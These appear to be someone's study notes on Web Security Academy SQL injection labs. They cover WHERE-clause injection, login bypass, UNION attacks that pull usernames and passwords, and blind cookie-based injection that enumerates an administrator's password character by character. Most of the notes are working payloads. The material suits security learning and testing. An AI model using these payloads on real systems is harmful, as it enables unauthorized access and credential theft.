# Web Security Academy

## SQL injection

### Check SQL injection vulnerability in WHERE clause - Apprentice

```
# original query

SELECT * FROM products WHERE category = 'Gifts' AND release = 1

# TEST

# SQLi payload = '--

# Injected query
SELECT * FROM products WHERE category = '--

# Interpreted query
SELECT * FROM products WHERE category = ''

# SQLi payload = ' or 1=1--
SELECT * FROM products WHERE category = '' or 1=1--
```

### SQLi vulnerabily allowing login bypass - Apprentice

```
# perform SQLi attack and login as "administrator" user

# original query

SELECT firstname FROM users WHERE username = 'administrator' AND password = 'secretpasswd'

# TEST

#SQLi payload = '--

SELECT firstname FROM users WHERE username = 'administrator'--
```

### SQLi UNION attack - Practictioner

#### Union operator:

```
table1
a | b
1 , 2
3 , 4

table2
c | d
2 , 3
4 , 5

select a,b from table1

1,2
3,4

select a,b from table1 UNION select c,d from table2

1,2
3,4
2,3
4,5

```

> Rule:
>
> 1. The number and the order of the columns must be the same in all queries
> 2. The data types must be compatible

#### SQLi way 1:

```
select ? from table1' UNION select NULL--
# error -> incorrect number of columns

select ? from table1' UNION select NULL, NULL, NUll--
# 200 response code -> correct number of columns
```

#### SQLi way 2:

```
# increment the order by number (x) until you get an error (it means the number of columns is equals to x-1)
select ? from table1' order by 3--
```

#### Check the columns type

```
# because of rule 2, we can easily check the type of a column like this:
# let's say the one below is table1:

a | b
1 , mario

select a, b from table1' UNION select NULL, 'a'--
# if no error occurs, it means the second column of table1 is of type text and the result of the query will be:

1 , mario
2 , a
```

#### Retrieve data from other tables

```
# As soon as we discover the number of columns for a specific table and its columns type, we can proceed with the following UNION attack:

# SLQi payload = ' UNION select username, password from users--
select a, b from products where category = 'Gifts' UNION select username, password from users--

```

#### Retrieve multiple values in a single column

```
# As soon as we discover the number of columns for a specific table and its columns type, we can proceed

# in order to print multiple values in a single column, we need to use the string concatenation operator. Since there is a different syntax based on the db type, we need to check it before proceeding (check the cheet sheet for checking the db version)

# let's suppose we are dealing with a PostrgeSQL db, we can inject the following SQLi payload for retrieving username and password in a single column

' UNION select NULL, username || * || password from users--

# where the || is the concat operator and * is a separator of our choice to understand where the username text ends and the password's starts
```

### Blind SQL Injection with conditional responses - Practitioner

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities.

#### 1. Check that the parameter is vulnerable to SQLi

```
# if the Cookie: TrackingId is TRUE, it returns "Welcome back!"

Cookie: TrackingId=xyz' and 1=1--

# check no "Welcome Back!" if FALSE

Cookie: TrackingId=xyz' and 1=2--
```

#### 2. Check the existence of a user table

```
# without the LIMIT 1, the query would have print as much 'x' as the number of rows in users

Cookie: TrackingId=xyz' and (SELECT 'x' FROM users LIMIT 1)='x'--

SELECT 'x' FROM users
```

#### 3. Confirm that username "administrator" exists in the "users" table

```
Cookie: TrackingId=xyz' and (SELECT username FROM users where username='administrator')='administrator'--
```

#### 4. Enumerate the password of the administrator user

```
TRUE CASE

Cookie: TrackingId=xyz' and (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1)='administrator'--

FALSE CASE

Cookie: TrackingId=xyz' and (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>50)='administrator'--
```

It's possible to enumerate the length number by sending the request to the Intruder and using a Numbers paylod type. Then by checking the length of the response, we can deduce that the exact length is 20.

```
TEST CASE

Cookie: TrackingId=xyz' and (SELECT username FROM users WHERE username='administrator' and LENGTH(password)=20)='administrator'--

```

Now we know the exact length of the password, it's time to brute force it.

```
# we are going to use a sniper attack with a brute forcer payload type in order to try all the alphanumerical chars

Cookie: TrackingId=xyz' and (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

```

In order to discover the password faster, we are gonna use a Cluster Bomb attack for iterating on both the first index of the substring and the characters of the password.
